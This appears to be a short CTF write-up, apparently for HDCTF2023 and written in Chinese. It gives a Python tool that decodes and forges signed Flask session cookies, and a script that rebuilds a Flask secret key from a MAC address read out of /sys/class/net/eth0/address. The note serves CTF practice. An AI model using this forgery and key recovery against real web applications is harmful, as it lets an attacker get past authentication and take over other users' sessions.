# Session伪造

```python
import zlib
from itsdangerous import base64_decode
import ast
from abc import ABC
import json

from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


class FSCM(ABC):
    def encode(self, secret_key, session_cookie_structure):
        """ Encode a Flask session cookie """
        try:
            app = MockApp(secret_key)

            session_cookie_structure = json.loads(session_cookie_structure)
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.dumps(session_cookie_structure)
        except Exception as e:
            return "[Encoding error] {}".format(e)
            raise e

    def decode(self, session_cookie_value, secret_key=None):
        """ Decode a Flask cookie  """
        try:
            if (secret_key == None):
                compressed = False
                payload = session_cookie_value

                if payload.startswith('.'):
                    compressed = True
                    payload = payload[1:]

                data = payload.split(".")[0]

                data = base64_decode(data)
                if compressed:
                    data = zlib.decompress(data)

                return data
            else:
                app = MockApp(secret_key)

                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.loads(session_cookie_value)
        except Exception as e:
            return "[Decoding error] {}".format(e)
            raise e


fscm = FSCM()
decoded = fscm.decode("eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZEUgKg.Ai4qoRiy3lT9idUgH_6pQ_Ci2GA", "231.28194338656192")
print(decoded)
print(fscm.encode("231.28194338656192", '{"passport": "Welcome To HDCTF2023"}'))
```

# random seed计算

```python
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*100)
```

`uuid.getnode()`获取网卡mac地址并转换成十进制数返回

读`/sys/class/net/eth0/address`文件得到mac地址

```python
import uuid
import random
 
mac = "02:42:ac:10:b4:41"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
random.seed(mac)
randStr = str(random.random()*100)
print(randStr)
```



